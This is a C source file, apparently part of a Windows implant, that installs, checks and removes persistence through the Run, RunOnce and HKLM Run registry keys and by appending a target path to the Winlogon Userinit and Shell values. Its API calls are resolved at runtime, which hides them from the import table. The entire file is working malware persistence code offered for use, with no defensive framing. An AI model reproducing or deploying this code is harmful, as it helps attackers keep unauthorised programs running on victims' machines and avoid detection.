#include "PersistReg.h"
#include "utils.h"
#include "ntdll.h"

// Registry key paths
static const CHAR* g_RegRunKeyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
static const CHAR* g_RegRunOnceKeyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
static const CHAR* g_RegRunMachineKeyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
static const CHAR* g_RegUserinitPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
static const CHAR* g_RegShellPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";

// Helper function to open registry key
static HKEY OpenRegKey(HKEY hRootKey, LPCSTR subKey, REGSAM access) {
    typedef LONG(WINAPI* RegOpenKeyExA_t)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
    RegOpenKeyExA_t pRegOpenKeyExA = (RegOpenKeyExA_t)GetProcAddress(
        SysModules->Advapi32, "RegOpenKeyExA");

    if (!pRegOpenKeyExA) return NULL;

    HKEY hKey = NULL;
    LONG result = pRegOpenKeyExA(hRootKey, subKey, 0, access, &hKey);

    return (result == ERROR_SUCCESS) ? hKey : NULL;
}

// Helper function to set registry value
static BOOL SetRegValue(HKEY hKey, LPCSTR valueName, LPCSTR value) {
    typedef LONG(WINAPI* RegSetValueExA_t)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
    RegSetValueExA_t pRegSetValueExA = (RegSetValueExA_t)GetProcAddress(
        SysModules->Advapi32, "RegSetValueExA");

    if (!pRegSetValueExA) return FALSE;

    LONG result = pRegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)value, (DWORD)strlen(value) + 1);
    return result == ERROR_SUCCESS;
}

// Helper function to query registry value
static BOOL QueryRegValue(HKEY hKey, LPCSTR valueName, LPSTR pValue, LPDWORD pSize) {
    typedef LONG(WINAPI* RegQueryValueExA_t)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
    RegQueryValueExA_t pRegQueryValueExA = (RegQueryValueExA_t)GetProcAddress(
        SysModules->Advapi32, "RegQueryValueExA");

    if (!pRegQueryValueExA) return FALSE;

    DWORD type = REG_SZ;
    LONG result = pRegQueryValueExA(hKey, valueName, NULL, &type, (LPBYTE)pValue, pSize);
    return result == ERROR_SUCCESS;
}

// Helper function to delete registry value
static BOOL DeleteRegValue(HKEY hKey, LPCSTR valueName) {
    typedef LONG(WINAPI* RegDeleteValueA_t)(HKEY, LPCSTR);
    RegDeleteValueA_t pRegDeleteValueA = (RegDeleteValueA_t)GetProcAddress(
        SysModules->Advapi32, "RegDeleteValueA");

    if (!pRegDeleteValueA) return FALSE;

    LONG result = pRegDeleteValueA(hKey, valueName);
    return result == ERROR_SUCCESS;
}

// Helper function to close registry key
static void CloseRegKey(HKEY hKey) {
    typedef LONG(WINAPI* RegCloseKey_t)(HKEY);
    RegCloseKey_t pRegCloseKey = (RegCloseKey_t)GetProcAddress(
        SysModules->Advapi32, "RegCloseKey");

    if (pRegCloseKey && hKey) {
        pRegCloseKey(hKey);
    }
}

// Get current executable path
BOOL GetCurrentExePath(LPSTR pPath, SIZE_T maxSize) {
    if (!pPath || maxSize == 0) return FALSE;

    typedef DWORD(WINAPI* GetModuleFileNameA_t)(HMODULE, LPSTR, DWORD);
    GetModuleFileNameA_t pGetModuleFileNameA = (GetModuleFileNameA_t)GetProcAddress(
        SysModules->Kernel32, "GetModuleFileNameA");

    if (!pGetModuleFileNameA) return FALSE;

    DWORD len = pGetModuleFileNameA(NULL, pPath, (DWORD)maxSize);
    return len > 0 && len < maxSize;
}

// Install Run key persistence
BOOL InstallRegPersistRun(LPCSTR valueName, LPCSTR targetPath, LPCSTR arguments) {
    if (!valueName || !targetPath) return FALSE;

    HKEY hKey = OpenRegKey(HKEY_CURRENT_USER, g_RegRunKeyPath, KEY_SET_VALUE);
    if (!hKey) return FALSE;

    // Build command line
    CHAR cmdLine[MAX_PATH * 2] = { 0 };
    if (arguments && strlen(arguments) > 0) {
        ApiWin->snprintf(cmdLine, sizeof(cmdLine), "\"%s\" %s", targetPath, arguments);
    }
    else {
        ApiWin->snprintf(cmdLine, sizeof(cmdLine), "\"%s\"", targetPath);
    }

    BOOL result = SetRegValue(hKey, valueName, cmdLine);
    CloseRegKey(hKey);

    return result;
}

// Install RunOnce key persistence
BOOL InstallRegPersistRunOnce(LPCSTR valueName, LPCSTR targetPath, LPCSTR arguments) {
    if (!valueName || !targetPath) return FALSE;

    HKEY hKey = OpenRegKey(HKEY_CURRENT_USER, g_RegRunOnceKeyPath, KEY_SET_VALUE);
    if (!hKey) return FALSE;

    CHAR cmdLine[MAX_PATH * 2] = { 0 };
    if (arguments && strlen(arguments) > 0) {
        ApiWin->snprintf(cmdLine, sizeof(cmdLine), "\"%s\" %s", targetPath, arguments);
    }
    else {
        ApiWin->snprintf(cmdLine, sizeof(cmdLine), "\"%s\"", targetPath);
    }

    BOOL result = SetRegValue(hKey, valueName, cmdLine);
    CloseRegKey(hKey);

    return result;
}

// Install HKLM Run key persistence (requires admin)
BOOL InstallRegPersistRunMachine(LPCSTR valueName, LPCSTR targetPath, LPCSTR arguments) {
    if (!valueName || !targetPath) return FALSE;

    if (!IsElevate()) {
        return FALSE; // Requires admin
    }

    HKEY hKey = OpenRegKey(HKEY_LOCAL_MACHINE, g_RegRunMachineKeyPath, KEY_SET_VALUE);
    if (!hKey) return FALSE;

    CHAR cmdLine[MAX_PATH * 2] = { 0 };
    if (arguments && strlen(arguments) > 0) {
        ApiWin->snprintf(cmdLine, sizeof(cmdLine), "\"%s\" %s", targetPath, arguments);
    }
    else {
        ApiWin->snprintf(cmdLine, sizeof(cmdLine), "\"%s\"", targetPath);
    }

    BOOL result = SetRegValue(hKey, valueName, cmdLine);
    CloseRegKey(hKey);

    return result;
}

// Remove registry persistence
BOOL RemoveRegPersist(LPCSTR valueName, REG_PERSIST_TYPE type) {
    if (!valueName) return FALSE;

    HKEY hKey = NULL;
    const CHAR* keyPath = NULL;
    HKEY rootKey = HKEY_CURRENT_USER;

    switch (type) {
    case REG_PERSIST_RUN:
        keyPath = g_RegRunKeyPath;
        break;
    case REG_PERSIST_RUNONCE:
        keyPath = g_RegRunOnceKeyPath;
        break;
    case REG_PERSIST_RUN_SERVICE:
        keyPath = g_RegRunMachineKeyPath;
        rootKey = HKEY_LOCAL_MACHINE;
        break;
    default:
        return FALSE;
    }

    hKey = OpenRegKey(rootKey, keyPath, KEY_SET_VALUE);
    if (!hKey) return FALSE;

    BOOL result = DeleteRegValue(hKey, valueName);
    CloseRegKey(hKey);

    return result;
}

// Check if registry persistence exists
BOOL CheckRegPersist(LPCSTR valueName, REG_PERSIST_TYPE type) {
    if (!valueName) return FALSE;

    HKEY hKey = NULL;
    const CHAR* keyPath = NULL;
    HKEY rootKey = HKEY_CURRENT_USER;

    switch (type) {
    case REG_PERSIST_RUN:
        keyPath = g_RegRunKeyPath;
        break;
    case REG_PERSIST_RUNONCE:
        keyPath = g_RegRunOnceKeyPath;
        break;
    case REG_PERSIST_RUN_SERVICE:
        keyPath = g_RegRunMachineKeyPath;
        rootKey = HKEY_LOCAL_MACHINE;
        break;
    default:
        return FALSE;
    }

    hKey = OpenRegKey(rootKey, keyPath, KEY_QUERY_VALUE);
    if (!hKey) return FALSE;

    CHAR value[MAX_PATH * 2] = { 0 };
    DWORD size = sizeof(value);
    BOOL result = QueryRegValue(hKey, valueName, value, &size);
    CloseRegKey(hKey);

    return result;
}

// Install registry persistence using configuration
BOOL InstallRegPersist(PREG_PERSIST_CONFIG pConfig) {
    if (!pConfig || !pConfig->valueName || !pConfig->targetPath) {
        return FALSE;
    }

    // Check if admin is required
    if (pConfig->bRequireAdmin && !IsElevate()) {
        return FALSE;
    }

    switch (pConfig->type) {
    case REG_PERSIST_RUN:
        return InstallRegPersistRun(pConfig->valueName, pConfig->targetPath, pConfig->arguments);

    case REG_PERSIST_RUNONCE:
        return InstallRegPersistRunOnce(pConfig->valueName, pConfig->targetPath, pConfig->arguments);

    case REG_PERSIST_RUN_SERVICE:
        return InstallRegPersistRunMachine(pConfig->valueName, pConfig->targetPath, pConfig->arguments);

    case REG_PERSIST_USERINIT:
        return InstallUserinitPersist(pConfig->targetPath);

    case REG_PERSIST_SHELL:
        return InstallShellPersist(pConfig->targetPath);

    default:
        return FALSE;
    }
}

// Install Userinit persistence (requires admin)
BOOL InstallUserinitPersist(LPCSTR targetPath) {
    if (!targetPath) return FALSE;

    if (!IsElevate()) return FALSE;

    HKEY hKey = OpenRegKey(HKEY_LOCAL_MACHINE, g_RegUserinitPath, KEY_QUERY_VALUE | KEY_SET_VALUE);
    if (!hKey) return FALSE;

    // Get current Userinit value
    CHAR currentValue[MAX_PATH * 4] = { 0 };
    DWORD size = sizeof(currentValue);
    if (!QueryRegValue(hKey, "Userinit", currentValue, &size)) {
        CloseRegKey(hKey);
        return FALSE;
    }

    // Check if already present
    if (strstr(currentValue, targetPath) != NULL) {
        CloseRegKey(hKey);
        return TRUE; // Already installed
    }

    // Append to Userinit
    CHAR newValue[MAX_PATH * 4] = { 0 };
    ApiWin->snprintf(newValue, sizeof(newValue), "%s,%s", currentValue, targetPath);

    BOOL result = SetRegValue(hKey, "Userinit", newValue);
    CloseRegKey(hKey);

    return result;
}

// Remove Userinit persistence
BOOL RemoveUserinitPersist(LPCSTR targetPath) {
    if (!targetPath) return FALSE;

    if (!IsElevate()) return FALSE;

    HKEY hKey = OpenRegKey(HKEY_LOCAL_MACHINE, g_RegUserinitPath, KEY_QUERY_VALUE | KEY_SET_VALUE);
    if (!hKey) return FALSE;

    CHAR currentValue[MAX_PATH * 4] = { 0 };
    DWORD size = sizeof(currentValue);
    if (!QueryRegValue(hKey, "Userinit", currentValue, &size)) {
        CloseRegKey(hKey);
        return FALSE;
    }

    // Find and remove targetPath from value
    CHAR* pos = strstr(currentValue, targetPath);
    if (!pos) {
        CloseRegKey(hKey);
        return TRUE; // Not present
    }

    // Remove the target path
    CHAR newValue[MAX_PATH * 4] = { 0 };
    CHAR* src = currentValue;
    CHAR* dst = newValue;

    while (*src) {
        if (src == pos) {
            // Skip the target path
            src += strlen(targetPath);
            if (*src == ',') src++; // Skip comma
        }
        else {
            *dst++ = *src++;
        }
    }
    *dst = '\0';

    // Remove trailing comma
    if (strlen(newValue) > 0 && newValue[strlen(newValue) - 1] == ',') {
        newValue[strlen(newValue) - 1] = '\0';
    }

    BOOL result = SetRegValue(hKey, "Userinit", newValue);
    CloseRegKey(hKey);

    return result;
}

// Install Shell persistence
BOOL InstallShellPersist(LPCSTR targetPath) {
    if (!targetPath) return FALSE;

    if (!IsElevate()) return FALSE;

    HKEY hKey = OpenRegKey(HKEY_LOCAL_MACHINE, g_RegShellPath, KEY_QUERY_VALUE | KEY_SET_VALUE);
    if (!hKey) return FALSE;

    // Get current Shell value
    CHAR currentValue[MAX_PATH * 2] = { 0 };
    DWORD size = sizeof(currentValue);
    if (!QueryRegValue(hKey, "Shell", currentValue, &size)) {
        // Default is "explorer.exe"
        strcpy_s(currentValue, sizeof(currentValue), "explorer.exe");
    }

    // Check if already present
    if (strstr(currentValue, targetPath) != NULL) {
        CloseRegKey(hKey);
        return TRUE;
    }

    // Append to Shell
    CHAR newValue[MAX_PATH * 2] = { 0 };
    ApiWin->snprintf(newValue, sizeof(newValue), "%s,%s", currentValue, targetPath);

    BOOL result = SetRegValue(hKey, "Shell", newValue);
    CloseRegKey(hKey);

    return result;
}

// Remove Shell persistence
BOOL RemoveShellPersist(LPCSTR targetPath) {
    if (!targetPath) return FALSE;

    if (!IsElevate()) return FALSE;

    HKEY hKey = OpenRegKey(HKEY_LOCAL_MACHINE, g_RegShellPath, KEY_QUERY_VALUE | KEY_SET_VALUE);
    if (!hKey) return FALSE;

    CHAR currentValue[MAX_PATH * 2] = { 0 };
    DWORD size = sizeof(currentValue);
    if (!QueryRegValue(hKey, "Shell", currentValue, &size)) {
        CloseRegKey(hKey);
        return FALSE;
    }

    CHAR* pos = strstr(currentValue, targetPath);
    if (!pos) {
        CloseRegKey(hKey);
        return TRUE;
    }

    CHAR newValue[MAX_PATH * 2] = { 0 };
    CHAR* src = currentValue;
    CHAR* dst = newValue;

    while (*src) {
        if (src == pos) {
            src += strlen(targetPath);
            if (*src == ',') src++;
        }
        else {
            *dst++ = *src++;
        }
    }
    *dst = '\0';

    if (strlen(newValue) > 0 && newValue[strlen(newValue) - 1] == ',') {
        newValue[strlen(newValue) - 1] = '\0';
    }

    // Default back to explorer.exe if empty
    if (strlen(newValue) == 0) {
        strcpy_s(newValue, sizeof(newValue), "explorer.exe");
    }

    BOOL result = SetRegValue(hKey, "Shell", newValue);
    CloseRegKey(hKey);

    return result;
}